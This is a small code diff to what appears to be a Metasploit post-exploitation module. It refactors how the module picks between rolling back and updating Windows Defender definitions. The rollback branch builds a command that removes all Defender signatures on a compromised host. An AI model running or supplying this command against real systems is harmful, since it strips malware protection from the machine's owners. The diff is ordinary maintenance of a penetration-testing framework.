@@ -75,12 +75,15 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::NoTarget, 'Defender is not enabled')
     end
 
-    print_status('Removing all definitions for Windows Defender')
-
-    if datastore['ACTION'].casecmp('Rollback') == 0
+    case action.name
+    when 'ROLLBACK'
+      print_status('Removing all definitions for Windows Defender')
       cmd = "cmd.exe /c \"#{file_path}\" -RemoveDefinitions -All"
-    else
+    when 'UPDATE'
+      print_status('Updating definitions for Windows Defender')
       cmd = "cmd.exe /c \"#{file_path}\" -SignatureUpdate"
+    else
+      fail_with(Failure::BadConfig, 'Unknown action provided!')
     end
     print_status("Running #{cmd}")
     output = cmd_exec(cmd).to_s
